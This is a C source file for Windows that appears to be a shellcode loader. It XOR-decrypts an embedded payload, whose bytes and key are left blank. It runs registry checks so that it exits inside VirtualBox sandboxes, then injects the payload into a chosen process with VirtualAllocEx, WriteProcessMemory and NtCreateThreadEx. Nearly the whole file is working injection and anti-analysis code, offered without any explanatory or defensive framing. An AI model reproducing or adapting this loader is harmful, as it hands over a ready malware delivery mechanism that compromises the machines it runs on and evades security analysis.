#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <winternl.h>

// Function pointer for NtCreateThreadEx
typedef NTSTATUS(WINAPI* PNtCreateThreadEx)(
    PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID,
    PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID
);

// Encrypted shellcode
unsigned char encryptedPayload[] = { };


// XOR decryption key
char decryptionKey[] = "";

// XOR decryption routine
void decryptPayload(char* data, size_t dataLength, char* key, size_t keyLength) {
    for (size_t i = 0, j = 0; i < dataLength; i++, j++) {
        if (j >= keyLength) j = 0;
        data[i] ^= key[j];
    }
}
int checkRegistryKey(HKEY rootKey, char* subKeyName) {
  HKEY registryKey = NULL;
  LONG result = RegOpenKeyExA(rootKey, subKeyName, 0, KEY_READ, &registryKey);
  if (result == ERROR_SUCCESS) {
    RegCloseKey(registryKey);
    return TRUE;
  }
  return FALSE;
}

int compareRegistryKeyValue(HKEY rootKey, char* subKeyName, char* registryValue, char* comparisonValue) {
  HKEY registryKey = NULL;
  LONG result;
  char value[1024];
  DWORD size = sizeof(value);
  result = RegOpenKeyExA(rootKey, subKeyName, 0, KEY_READ, &registryKey);
  if (result == ERROR_SUCCESS) {
    result = RegQueryValueExA(registryKey, registryValue, NULL, NULL, (LPBYTE)value, &size);
    RegCloseKey(registryKey);
    if (result == ERROR_SUCCESS) {
      if (strcmp(value, comparisonValue) == 0) {
        return TRUE;
      }
    }
  }
  return FALSE;
}



int main(int argc, char* argv[]) {
    if (argc != 2) {
        printf("[!] Usage: %s <PID>\n", argv[0]);
        return -1;
    }
        // Anti-VM checks
    if (checkRegistryKey(HKEY_LOCAL_MACHINE, "HARDWARE\\ACPI\\FADT\\VBOX__")) {
        printf("VirtualBox VM registry path value detected :(\n");
        return -2;
    }
    

    if (compareRegistryKeyValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\SystemInformation",
                               "SystemProductName", "VirtualBox")) {
        printf("VirtualBox VM registry key value detected :(\n");
        return -2;
    }

    if (compareRegistryKeyValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\SystemInformation",
                               "BiosVersion", "VirtualBox")) {
        printf("VirtualBox VM BIOS version detected :(\n");
        return -2;
    }

    
    DWORD pid = atoi(argv[1]);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        printf("[!] Failed to open process. Error: %lu\n", GetLastError());
        return -1;
    }

    decryptPayload((char*)encryptedPayload, sizeof(encryptedPayload), decryptionKey, strlen(decryptionKey));

    LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof(encryptedPayload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBuffer) {
        printf("[!] VirtualAllocEx failed. Error: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return -1;
    }

    if (!WriteProcessMemory(hProcess, remoteBuffer, encryptedPayload, sizeof(encryptedPayload), NULL)) {
        printf("[!] WriteProcessMemory failed. Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }

    // Load ntdll.dll and resolve NtCreateThreadEx
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[!] Failed to get ntdll handle.\n");
        return -1;
    }

    PNtCreateThreadEx NtCreateThreadEx = (PNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
    if (!NtCreateThreadEx) {
        printf("[!] Failed to get NtCreateThreadEx address.\n");
        return -1;
    }

    HANDLE hThread = NULL;
    NTSTATUS status = NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, FALSE, 0, 0, 0, NULL);

    if (status != 0 || !hThread) {
        printf("[!] NtCreateThreadEx failed. NTSTATUS: 0x%X\n", status);
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }

    printf("[+] Remote thread created successfully!\n");

    // Cleanup
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}
